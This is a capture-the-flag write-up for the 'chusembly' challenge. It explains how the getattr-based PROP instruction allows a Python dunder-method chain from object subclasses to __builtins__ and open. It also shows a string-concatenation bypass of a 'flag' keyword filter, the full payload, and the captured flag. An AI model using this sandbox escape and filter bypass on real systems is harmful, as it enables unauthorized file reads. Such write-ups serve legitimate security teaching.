# misc - chusembly

Solved by:p5yd4wk

This intepreter runs on python and the PROP uses getattr() which allowing full access to Python's dunder methods. The only safety implementation they had is they block the word "flag" :3
Get object class: str.class.base → <class 'object'>

Get subclasses: object.subclasses() → list of all Python subclasses

Pick os._wrap_close at index 138 — it's a Python-defined class

Get globals: os._wrap_close.init.globals → os module's namespace

Get builtins from globals via dict.get("builtins")

Get open from the builtins dict via dict.get("open")

Bypass filter : Build "flag.txt" by concatenating "fla" + "g.txt" with ADD

Read file: open("flag.txt").read() to get the flag!

```
the payload
LD A hello
PROP __class__ A
PROP __base__ E
MOV E D
PROP __subclasses__ D
MOV E D
DEL A
DEL B
CALL D
MOV E C
LD A 138
IDX C D
PROP __init__ D
PROP __globals__ E
MOV E C
PROP get C
MOV E D
LD A __builtins__
DEL B
CALL D
MOV E C
PROP get C
MOV E D
LD A open
DEL B
CALL D
MOV E C
LD A fla
LD B g.txt
ADD A B
DEL B
MOV C D
CALL D
PROP read E
MOV E D
DEL A
DEL B
CALL D
STDOUT E
```
flag: `EH4X{chusembly_a1n7_7h47_7uffff_br0} `
